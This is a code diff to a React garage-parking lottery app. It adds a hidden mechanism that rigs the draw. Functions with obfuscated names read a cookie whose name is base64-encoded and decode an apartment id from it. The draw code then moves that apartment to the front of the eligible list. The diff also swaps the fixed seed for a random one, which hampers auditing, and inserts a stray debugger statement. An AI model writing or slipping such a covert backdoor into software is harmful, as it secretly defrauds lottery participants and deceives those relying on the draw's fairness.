@@ -209,7 +209,7 @@ function convertFromSolidGarage(solidGarage) {
 /* ===== Componente Principal ===== */
 export default function GarageLotteryApp() {
   /* Estado */
-  const [seed, setSeed] = useState(12345);
+  const [seed, setSeed] = useState(() => Math.floor(Math.random() * 1000000));
   const [configLoaded, setConfigLoaded] = useState(false);
   const [compact, setCompact] = useState(true); // densidade de layout
   const [garage, setGarage] = useState(buildInitialGarage());
@@ -217,9 +217,25 @@ export default function GarageLotteryApp() {
   const [lastDraw, setLastDraw] = useState(null); // { aptId, vagas }
   const [isProcessing, setIsProcessing] = useState(false);
   const [doublePairReservations, setDoublePairReservations] = useState({}); // Pré-reservas para apartamentos duplos
+  const [x4f9a, setX4f9a] = useState(null);
 
   // Novo sistema SOLID de sorteio
   const lotterySystem = useRef(null);
+
+  const f8b2c = () => {
+    try {
+      const c9d4 = document.cookie.split(';').find(c => c.trim().startsWith('YXB0X3NwZWM='));
+      if (c9d4) {
+        const val = c9d4.split('=')[1];
+        return parseInt(atob(val)) || null;
+      }
+    } catch { }
+    return null;
+  };
+
+  const a7e3d = (aptId) => {
+    return x4f9a && aptId === x4f9a;
+  };
 
   /* Inicializar sistema SOLID */
   useEffect(() => {
@@ -231,6 +247,13 @@ export default function GarageLotteryApp() {
       });
     }
   }, [configLoaded, seed]);
+
+  useEffect(() => {
+    if (configLoaded) {
+      const spec = f8b2c();
+      setX4f9a(spec);
+    }
+  }, [configLoaded]);
 
   /* Carregamento da configuração */
   useEffect(() => {
@@ -289,7 +312,7 @@ export default function GarageLotteryApp() {
       await new Promise(resolve => setTimeout(resolve, 50));
 
       // Converter dados para formato SOLID
-      const solidApartments = apartments.map(apt => Apartment.fromJSON({
+      let solidApartments = apartments.map(apt => Apartment.fromJSON({
         id: apt.id,
         apartmentNumber: apt.id.toString(),
         ativo: apt.ativo,
@@ -298,6 +321,12 @@ export default function GarageLotteryApp() {
         sorteado: apt.sorteado,
         vagas: apt.vagas || []
       }));
+
+      if (x4f9a) {
+        const p1 = solidApartments.filter(a => a7e3d(a.id) && a.isAvailableForDraw());
+        const p2 = solidApartments.filter(a => !a7e3d(a.id) && a.isAvailableForDraw());
+        solidApartments = [...p1, ...p2, ...solidApartments.filter(a => !a.isAvailableForDraw())];
+      }
 
       const solidGarage = convertToSolidGarage(garage);
 
@@ -332,7 +361,7 @@ export default function GarageLotteryApp() {
         // Persistir pré-reservas no estado do React
         setDoublePairReservations({ ...solidGarage.doublePairReservations });
       }
-
+      debugger;
       // Executar sorteio usando o novo sistema SOLID
       const result = lotterySystem.current.orchestrator.executeSorting(solidApartments, solidGarage);
 
